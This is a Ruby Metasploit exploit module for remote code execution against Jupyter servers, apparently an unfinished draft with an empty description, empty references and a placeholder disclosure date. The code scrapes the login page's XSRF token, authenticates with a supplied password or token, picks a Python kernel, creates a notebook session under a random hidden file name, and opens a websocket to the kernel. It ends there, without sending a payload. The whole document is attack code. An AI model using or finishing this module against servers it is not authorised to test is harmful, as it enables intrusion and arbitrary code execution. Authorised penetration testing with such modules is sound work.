##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jupyter Code Execution',
      'Description'    => %q{
      },
      'Author' =>
        [
          'Spencer McIntyre'
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'WfsDelay' => '10',
        },
      'References'     =>
        [
        ],
      'Platform'  => %w{ win linux unix python },
      'Targets'   =>
        [
          ['Python', {'Arch'  => ARCH_PYTHON }],
        ],
      'DisclosureDate' => 'Jan 18 2013', # todo: update me
      'DefaultTarget'  => 0,
      'Notes'          =>
        {
          'Stability'   => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
          'Reliability' => [ REPEATABLE_SESSION, ],
        },
    ))

    register_options(
      [
        OptString.new('PASSWORD',  [ false, 'The password or authentication token', '' ]),
        OptString.new('TARGETURI', [ true,  'The path to the Jupyter application', '/' ])
      ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    return CheckCode::Unknown('Failed to request the login page.') unless res&.code == 200
    token = res.get_html_document.xpath('//form//input[@name="_xsrf"]').first['value']

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'cookie' => res.get_cookies,
      'vars_post' => {
        'password' => datastore['PASSWORD'],
        '_xsrf' => token
      }
    })

    return CheckCode::Unknown('Failed to authenticate.') unless res&.code == 302

    @context = {
      cookies: [res.get_cookies, "_xsrf=#{token}"],
      xsrf_token: token
    }

    CheckCode::Appears
  end

  def send_request_api(uri, data: nil)
    opts = {
      'uri' => normalize_uri(target_uri.path, 'api', uri),
      'cookie' => @context[:cookies].join('; ')
    }
    if data.nil?
      opts['method'] = 'GET'
    else
      opts['method'] = 'POST'
      opts['ctype'] = 'application/json'
      opts['headers'] = {
        'X-Requested-With' => 'XMLHttpRequest',
        'X-XSRFToken' => @context[:xsrf_token]
      }
      opts['data'] = JSON.unparse(data)
    end

    res = send_request_cgi(opts)
    fail_with(Failure::UnexpectedReply, 'A request to the REST API failed.') if res.nil?

    res.get_json_document
  end

  def exploit
    result = send_request_api('kernelspecs')
    kernelspec = result['kernelspecs'].values.select { |value| value.dig('spec', 'language').downcase.start_with?('python') }.first

    print_status("Creating a session using kernel: #{kernelspec['name']}")
    result = send_request_api('sessions', data: {
      'path' => ".#{Rex::Text.rand_text_alphanumeric(16..32)}.ipynb",
      'type' => "notebook",
      'name' => '',
      'kernel' => {
        'id' => nil,
        'name' => kernelspec['name']
      }
    })

    id = result.dig('kernel', 'id')
    fail_with(Failure::UnexpectedReply, 'Failed to create a session with the selected kernel.') if id.nil?
    print_status("Created session id: #{result['id']}")

    socket = connect_ws({
      'uri' => normalize_uri(target_uri.path, 'api', 'kernels', id, 'channels'),
      'cookie' => @context[:cookies].join('; ')
    })
  end
end
